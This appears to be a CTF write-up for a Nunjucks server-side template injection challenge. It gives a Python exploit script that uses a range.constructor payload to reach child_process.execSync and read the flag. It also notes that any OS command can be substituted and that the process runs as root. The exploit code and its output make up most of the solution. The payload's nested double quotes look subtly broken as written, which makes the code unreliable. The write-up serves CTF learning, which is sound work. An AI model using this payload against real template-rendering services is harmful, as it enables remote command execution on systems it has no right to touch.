---
title: "SSTINode"
ctf: "CyberStrike CTF"
date: 2026-07-11
category: web
difficulty: very-hard
points: 450
flag_format: "cyberstrike{...}"
author: "retr0"
---

# SSTINode

## Summary

TemplateEngine renders attacker-supplied Nunjucks templates with a Node.js backend. Because the template string is user-controlled, Nunjucks's ability to reach the JavaScript runtime via prototype constructors turns expression evaluation into direct RCE through `child_process`.

## Solution

### Step 1: Confirm SSTI

The API at `/render` (JSON body `{template: ...}`) echoes template output, so `{{7*7}}` returns `49`.

### Step 2: RCE via Nunjucks constructor escape

Nunjucks exposes JS constructors inside expressions. Reaching `child_process` from `global.process.mainModule` gives command execution in one payload:

```python
import requests, json, re

URL = "http://chal.csc-snist.live:53170/render"

payload = {
    "template": '{{range.constructor("return global.process.mainModule.require("child_process").execSync("cat /flag")")()}}'
}

r = requests.post(URL, json=payload, timeout=10)
print(r.text)
flag = re.search(r'cyberstrike\{[^}]*\}', r.text).group(0)
print("[+]" + flag)
```

Output:

```
{"output":"cyberstrike{b1e3c1cacefffadd825bedeee4a9a3a5}\n","error":null}
```

### Notes

- The RCE primitive `range.constructor(...string-body...)()` works because Nunjucks lets you access the `Function` constructor via any built-in (`range` here), and Node's `global.process.mainModule.require` is reachable from inside the new function's scope.
- Swap `cat /flag` for any OS command; the process runs as root on the target.

## Flag

```
cyberstrike{b1e3c1cacefffadd825bedeee4a9a3a5}
```